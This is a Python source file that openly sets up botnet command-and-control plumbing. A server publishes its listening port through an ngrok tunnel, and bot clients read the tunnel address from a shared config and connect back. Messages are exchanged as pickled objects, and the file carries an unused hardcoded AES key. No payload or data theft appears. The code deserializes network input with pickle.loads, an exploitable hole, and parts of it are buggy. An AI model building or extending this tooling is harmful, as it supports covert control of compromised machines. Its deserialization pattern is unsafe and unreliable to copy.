import hashlib
import os
import random
import json
import pickle
from pyngrok import ngrok, conf
from socket import socket, timeout, error, AF_INET, SOCK_STREAM, SOCK_DGRAM, gethostbyname
from typing import Any
from dataclasses import dataclass, asdict
from Crypto.Util.Padding import pad, unpad
from Crypto.Cipher import AES


__cipher__ = bytes('YAHHUF!65g#1_fx3', 'utf-8')

class Config(object):
    __root__ = os.path.join(os.path.dirname(os.path.abspath(__file__)))

    @staticmethod
    def get_ngrok_binary(): return os.path.join(Config.__root__, 'bin', 'ngrok')
    @staticmethod
    def get_config_path(): return os.path.join(Config.__root__, 'config.json')
    @staticmethod
    def get_bot_config(): return os.path.join(Config.__root__, 'bot.json')

    @staticmethod
    def load_config(service=None):
        if service is None:
            config_json = Config.get_config_path()
        else:
            config_json = Config.get_bot_config()
        with open(config_json, 'r') as stream:
            data = json.load(stream)
            stream.close()
        return data

class BotnetSocket(socket):
    """
    class: BotnetSocket (socket)
    this class represents a wrapped socket.socket() object
    which is responsible to operate as a communication interface
    and transmit data between endpoints.
    """
    def __init__(self, *args, **kwargs):
        super(BotnetSocket, self).__init__(*args, **kwargs)


class BotnetInterface(object):
    """
    class: BotnetInterface (object)
    this class represents the scope interface of which a BOTNET network
    interacts interacts according to Admin's class requirements.
    """
    incoming = None
    outgoing = None
    tunnel = None
    config = Config.load_config()

    def __init__(self, insocket: socket = None, outsocket: socket = None):
        if isinstance(insocket, socket):
            self.incoming = insocket
        else:
            self.incoming = socket()

        if isinstance(outsocket, socket):
            self.outgoing = outsocket
        else:
            self.outgoing = socket()

    def populate(self): self.config = Config.load_config('bot')

    def distribute(self):
        bin_path = Config.get_ngrok_binary()
        tunnel = self.config.get('tunnel')
        incoming = self.config.get('incoming')
        pyngrok_config = conf.PyngrokConfig(ngrok_path=bin_path)
        self.tunnel = ngrok.connect(incoming.get('port'), tunnel.get('proto'), pyngrok_config=pyngrok_config)
        with open(Config.get_config_path(), 'r') as stream_read:
            data_read = json.load(stream_read)
            url, port = self.tunnel.public_url.split('://').pop().split(':')
            data_read.get('tunnel')['url'] = url
            data_read.get('tunnel')['port'] = int(port)
            data_write = data_read
            with open(Config.get_config_path(), 'w') as stream_write:
                stream_write.write(json.dumps(data_write))
                stream_write.close()
            stream_read.close()
        self.config = Config.load_config()
        with open(Config.get_bot_config(), 'w') as stream_write:
            data = json.dumps({
                "tunnel": self.config.get("tunnel"),
                "settings": self.config.get("settings")
            })
            stream_write.write(data)
            stream_write.close()

    def accept(self): return self.incoming.accept()

    def connect(self, _address: tuple):
        try:
            self.outgoing.connect(_address)
        except error as e:
            return e
        return True

    def bind(self, _address: tuple): self.incoming.bind(_address)

    def listen(self, _backlog: int): self.incoming.listen(_backlog)

    def send(self, data: Any, connection=None):
        data = pickle.dumps(data)
        if isinstance(connection, int):
            self.outgoing.sendall(data)
        else:
            connection.sendall(data)

    def receive(self, connection=None):
        connection = self.outgoing if not connection else connection
        data = b''
        pkt = connection.recv(self.config.get('settings').get('buffer'))
        while pkt:
            data += pkt
            if data != b'':
                break
            pkt = connection.recv(self.config.get('settings').get('buffer'))
        data = pickle.loads(data)
        return data


@dataclass
class BotnetData(object):
    """
    class: BotnetData (object)
    this class represents the data structure for
    which a socket endpoint transmit among the Flux Network.
    """
    Id: str
    DataText: str

    def __init__(self, data=None):
        self.Id = hex(id(data))
        self.DataText = data

    def __repr__(self):
        return '<BotnetData %r>' % asdict(self)


class Server:
    interface: BotnetInterface

    def __init__(self):
        self.interface = BotnetInterface(insocket=socket(AF_INET, SOCK_STREAM))
        self.interface.distribute()

    def bind_listen(self):
        self.interface.bind(('0.0.0.0', self.interface.config.get('incoming').get('port')))
        self.interface.listen(128)

    def accept(self):
        return self.interface.accept()

    def send(self, connection, data):
        self.interface.send(data=data, connection=connection)

    def receive(self, connection):
        return self.interface.receive(connection=connection)


class BotNet:
    interface: BotnetInterface

    def __init__(self):
        self.interface = BotnetInterface(insocket=None, outsocket=socket(AF_INET, SOCK_STREAM))
        self.interface.populate()

    def connect(self):
        tunnel = self.interface.config.get('tunnel')
        self.interface.connect((tunnel.get("url"), tunnel.get("port")))


if __name__ == '__main__':
    s = Server()
    s.bind_listen()
    cs, ca = s.accept()
    data = BotnetData(data=1)
    print(data)
    s.send(cs, data)


if __name__ == '__main__':
    bot = BotNet()
    bot.connect()
